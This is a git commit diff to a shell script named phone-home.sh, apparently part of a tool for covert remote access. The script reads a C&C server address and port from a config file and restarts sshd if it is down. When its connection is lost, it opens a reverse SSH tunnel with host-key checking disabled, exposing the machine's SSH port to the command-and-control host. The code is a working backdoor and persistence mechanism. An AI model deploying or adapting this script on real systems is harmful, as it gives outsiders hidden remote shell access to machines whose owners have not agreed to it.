c1536af3f450852c73a806eb1e18b5ffa7305c52
Alex Lauerman <alex.lauerman@gmail.com>
2017-03-05 14:07:47 -0500

    make sure sshd is up

--- phone-home.sh
+++ phone-home.sh
@@ -4,15 +4,24 @@ cd /opt/ssh-phone-home
 
 # Import the configuration variables
 CNC_IP=$(grep "CNC_IP" config | cut -d '=' -f 2)
+CNC_PORT=$(grep "CNC_PORT" config | cut -d '=' -f 2)
 DBUSER=$(grep "DBUSER" config | cut -d '=' -f 2)
 DBPORT=$(grep "DBPORT" config | cut -d '=' -f 2)
 
-if netstat -antp|grep ":443.\+ESTABLISHED.\+/ssh" ; then 
+if ps -ef | grep sshd | grep -v grep ; then
+   echo "SSHD is running"
+else
+   echo "SSHD isn't running"
+   service ssh start
+fi
+
+if netstat -antp|grep ":"$CNC_PORT".\+ESTABLISHED.\+/ssh" ; then 
     echo "CNC Connection is UP"
 else
     echo "CNC Connection is DOWN"
 
     ## Connect to the C&C ##
     echo Connecting...
-    ssh -nNT -i id_rsa $DBUSER@$CNC_IP -p 443 -o StrictHostKeyChecking=no -R $DBPORT:127.0.0.1:22 &
+    ssh -nNT -i id_rsa $DBUSER@$CNC_IP -p $CNC_PORT -o StrictHostKeyChecking=no -R $DBPORT:127.0.0.1:22 &
 fi
+
